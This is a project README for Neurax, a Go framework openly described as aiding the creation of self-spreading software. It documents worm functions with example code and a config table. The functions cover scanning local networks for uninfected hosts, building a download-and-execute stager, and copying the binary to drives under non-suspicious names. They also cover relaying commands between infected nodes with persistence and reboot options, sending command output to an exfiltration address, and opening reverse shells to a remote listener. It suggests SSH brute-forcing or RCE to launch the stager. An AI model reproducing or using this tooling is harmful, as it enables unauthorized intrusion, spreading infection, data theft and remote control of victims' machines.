<h1 align="center"> Neurax </h1> <br>

<p align="center">
  <a>
    <img alt="Neurax" title="Neurax" src="neurax.png">
  </a>
</p>

<p align="center"> A framework that aids in creation of self-spreading software</p>

## Requirements
`go get -u github.com/redcode-labs/Coldfire`

`go get -u github.com/yelinaung/go-haikunator`

## Usage
With help of Neurax, Golang binaries can spread on local network without using any external servers.

Diverse config options and command stagers allow rapid propagation across various wireless environments.
### Example code

```go
package main
import . "github.com/redcode-labs/Neurax"

func main(){

  //Specify serving port and stager to use
  NeuraxConfig.Port = 5555
  NeuraxConfig.Stager = "wget"

  //Start a server that exposes the current binary in the background
  go NeuraxServer()
 
  //Copy current binary to all logical drives
  NeuraxDisks()

  //Create a command stager that should be launched on target machine
  //It will download, decode and execute the binary
  cmd_stager := NeuraxStager()

  /* Now you have to somehow execute the command generated above.
     You can use SSH bruteforce, some RCE or whatever else you want ;> */

}
```

### List of config entries

<span style="color:#b45e02">Name</span> | <span style="color:#5f1e2d">Description</span> | <span style="color:#aa5502">Default value</span>
--- | --- | ---
NeuraxConfig.Stager           | Name of the command stager to use | `random, platform-compatible`
NeuraxConfig.Port             | Port to serve on | `6741`
NeuraxConfig.Platform         | Platform to target | `detected automatically`
NeuraxConfig.Path             | The path under which binary is saved on the host | `random`
NeuraxConfig.FileName        | Name under which downloaded binary should be served and then saved | `random`
NeuraxConfig.Base64           | Encode the transferred binary in base64 | `false`
NeuraxConfig.CommPort        | Port that is used by binaries to communicate with each other | `7777`
NeuraxConfig.CommProto       | Protocol for communication between nodes | `"udp"`
NeuraxConfig.ReverseListener | Contains `"<host>:<port>"` of remote reverse shell handler | `not specified`
NeuraxConfig.RequiredPort    | NeuraxScan() treats host as active only when it has a specific port opened| `none`
NeuraxConfig.ScanPassive     | NeuraxScan() detects hosts using passive ARP traffic monitoring | `false`
NeuraxConfig.ScanTimeout     | NeuraxScan() sets this value as timeout for scanned port in each thread | `2 seconds`
NeuraxConfig.ScanAll         | NeuraxScan() captures packets on all found devices | `current wireless`
NeuraxConfig.ReadArpCache   | NeuraxScan() scans first the hosts found in local ARP cache. Works only with active scan | `false`
NeuraxConfig.Cidr             | NeuraxScan() scans this CIDR | `local IP + "\24"`
NeuraxConfig.Threads          | Number of threads to use for NeuraxScan() | `10`
NeuraxConfig.FullRange       | NeuraxScan() scans all ports of target host to determine if it is active | `from 19 to 300`
NeuraxConfig.ScanInterval    | Time interval to sleep before scanning whole subnet again | `"2m"` 
NeuraxConfig.Verbose          | If true, all error messages are printed to STDOUT | `false`
NeuraxConfig.Remove           | When any errors occur, binary removes itself from the host | `false`
NeuraxConfig.PreventReexec   | If true, when any command matches with those that were already received before, it is not executed | `true`
NeuraxConfig.ExfilAddr       | Address to which output of command is sent when `'v'` preamble is present. | `none`

### Finding new targets
Function `NeuraxScan(c chan string)` enables detection of active hosts on local network.
It accepts a channel of type string as it's only argument and should be launched as a goroutine.
Any scanned host will be sent through that channel as soon as it was classified as active.
Host is treated as active when it has at least 1 open port, is not already infected + fullfils conditions specified within `NeuraxConfig`.

`NeuraxScan()` runs as infinite loop - it scans whole subnet specified by `.Cidr` config entry and when every host is scanned, function sleeps for an interval given in `.ScanInterval`.

### Disks infection
  Neurax binary doesn't have to copy itself using wireless means.
  Function `NeuraxDisks()` copies current binary (under non-suspicious name) to all logical drives that were found.
  Copied binary is not executed, but simply resides in it's destination waiting to be run.
  `NeuraxDisks()` returns an `error` if list of disks cannot be obtained or copying to any destination was impossible.

Another function, `NeuraxZIP(num_files int) err` allows to create a randomly named .zip archive containing current binary.
It is saved in current directory, and contains up to `num_files` random files it.

`NeuraxZIPSelf()` simply zips the current binary, creating an archive holding the same name.

### Synchronized command execution
Function `NeuraxOpenComm()` (launched as goroutine) allows binary to receive and execute commands.
It listens on port number specified in `.CommPort` using protocol defined in `.CommProto`.
Field `.CommProto` can be set either to `"tcp"` or `"udp"`.
Commands that are sent to the port used for communication are executed in a blind manner - their output isn't saved anywhere.

An optional preamble can be added before the command string.

Format: `:<preamble_letters> <command>` 

Example command with preamble might look like this: `:ar echo "pwned"`

Following letters can be specified inside preamble:
* `a`  - received command is forwarded to each infected node, but the node that first received the command will not execute it
* `x`  - received command will be executed even if `a` is specified
* `r`  - after receiving the command, binary removes itself from infected host and quits execution
* `k`  - keep preamble when sending command to other nodes
* `s`  - sleep random number of seconds between 1 and 5 before executing command
* `q`  - after command is executed, the machine reboots
* `o`  - command is sent to a single, random node. `a` must be specified
* `v`  - output of executed command is sent to an address specified under `.ExfilAddr`
* `m`  - mechanism that prevents re-execution of commands becomes disabled just for this specific command 
* `l`  - command is executed in infinite loop
* `e`  - command is executed only if the node has elevated privilleges
* `p`  - command becomes persistent and is executed upon each startup

By default, raw command sent without any preambles is executed by a single node that the command was addressed for.

It is also important to note that when `k` is not present inside preamble, preamble is removed from command right after the first node receives it.

#### Example 1 - preamble is not forwarded to other nodes:

```go
 (1) [TCP_client]    ":ar whoami" -----> [InfectedHost1] 
 (2) [InfectedHost1] "whoami"     -----> [InfectedHostN]
 
    [InfectedHost1] removes itself after command was sent to all infected nodes in (2)
     because "r" was specified in preamble. "x" was not specified, so "whoami" was not executed by [InfectedHost1] 
```
#### Example 2 - preamble is forwarded:

```go
 (1) [TCP_client]    ":akxr whoami"  -----> [InfectedHost1] 
 (2) [InfectedHost1] ":akxr whoami"  -----> [InfectedHostN]
 (n) [InfectedHostN] ":axkr whoami"  -----> ...............
 .................................   -----> ...............

 Both [InfectedHost1] and [InfectedHostN] execute command and they try to send it to another nodes with preamble preserved
```


### Reverse connections
An interactive reverse shell can be established with `NeuraxReverse(proto string)`.
The `proto` parameter should be either "tcp" or "udp".
It will receive commands from hostname specified inside `.ReverseListener` in a form of `"<host>:<port>"`.
If `NeuraxOpenComm()` was started before calling this function, each command will behave as described in above section.
If it was not, commands will be executed locally.

Note: this function should be also runned as goroutine to prevent blocking caused by infinite loop used for receiving.

### Cleaning up
Whenever `"purge"` command is received by a node, it resends this command to all other nodes, removes itself from host and quits.
This behaviour can be also commenced using `NeuraxPurge()` executed somewhere in the source.

## Support this tool
If you like this project and want to see it grow, please consider making a small donation :>

[ >>>>> DONATE <<<<<](https://paypal.me/redcodelabs?locale.x=pl_PL)


## Artwork credits

====> [Seto01](https://www.deviantart.com/seto01/art/New-disease-parasite-438032692) <====

## License
This software is under [MIT license](https://en.wikipedia.org/wiki/MIT_License)